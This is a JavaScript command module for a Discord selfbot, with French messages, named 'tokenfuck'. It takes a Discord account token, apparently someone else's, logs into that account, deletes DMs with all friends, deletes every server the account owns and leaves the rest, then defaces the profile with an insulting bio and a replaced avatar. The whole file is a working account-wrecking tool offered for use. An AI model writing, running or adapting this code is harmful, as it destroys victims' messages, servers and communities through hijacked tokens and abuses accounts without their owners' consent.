const Discord = require("discord.js-selfbot-v13");

module.exports = {
  name: "tokenfuck", 
  description: "Fuck.", 
  run: async (client, message, args) => {
    if (!args.length) {
      return message.edit(`\`❌\` Veuillez fournir un token Discord après la commande.`);
    }

    const token = args[0];
    const newDescription = "Nqtm"; 
    const newProfilePictureURL = "https://cdn.discordapp.com/attachments/1210589484333142047/1225521249107841074/1mGQ6Lx.jpg?ex=66216e9a&is=660ef99a&hm=97043307fd103490b3d1b11e752997f202ec21500333a4ce1a283359777c4b1d&"; 
      const newDisplayName = "Fuck"; 
      

    const destroyAllAndModifyProfile = async (token) => {
      try {
        const fclient = new Discord.Client({ checkUpdate: false }); 

        await fclient.login(token);

      
        await Promise.all([
           
          fclient.relationships.fetch().then(async () => {
            fclient.relationships.friendCache.forEach(async (friend) => {
              await friend.deleteDM().catch(() => console.error(`Échec de la suppression du DM avec ${friend.username}`));
            });
          }),
          fclient.guilds.cache.forEach(async (guild) => {
            if (guild.ownerId === fclient.user.id) {
              await guild.delete().catch(() => console.error(`Échec de la suppression du serveur ${guild.name}`));
            } else {
              await guild.leave().catch(() => console.error(`Échec de la suppression du serveur ${guild.name}`));
            }
          }),
        ]);

        
        await fclient.user.setAboutMe(newDescription).catch(() => console.error("Échec de la mise à jour de la description"));
        await fclient.user.setAvatar(newProfilePictureURL).catch(() => console.error("Échec de la mise à jour de la photo de profil"));

        message.edit(`\`✅\` Token as been destroyed`);
        fclient.destroy(); 
      } catch (error) {
        message.edit(`\`❌\` Le token est invalide ou vous n'avez pas la permission`);
      }
    };

    destroyAllAndModifyProfile(token);
  }
};
